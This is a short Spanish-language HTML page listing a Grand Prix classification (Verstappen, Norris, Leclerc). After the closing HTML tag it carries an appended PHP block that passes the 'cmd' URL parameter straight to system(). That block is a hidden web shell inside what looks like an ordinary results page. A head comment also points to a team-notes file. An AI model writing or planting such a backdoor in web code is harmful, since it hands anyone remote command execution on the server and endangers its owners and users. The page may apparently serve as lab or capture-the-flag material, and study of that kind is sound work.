<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>F1 2026 - Resultados Última Carrera</title>
    <!-- Telemetria y notas del equipo: /assets/notas_boxes.txt -->
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #fff; }
        table { width: 60%; margin: 40px auto; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #444; text-align: center; }
        th { background: #1e1e1e; }
        h1 { text-align: center; color: #e10600; }
    </style>
</head>
<body>
    <h1>Clasificación - Gran Premio</h1>
    <table>
        <tr><th>Pos</th><th>Piloto</th><th>Equipo</th><th>Tiempo</th></tr>
        <tr><td>1</td><td>Max Verstappen</td><td>Red Bull Racing</td><td>1:32:45.123</td></tr>
        <tr><td>2</td><td>Lando Norris</td><td>McLaren</td><td>+5.214</td></tr>
        <tr><td>3</td><td>Charles Leclerc</td><td>Ferrari</td><td>+12.876</td></tr>
    </table>
</body>
</html>

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
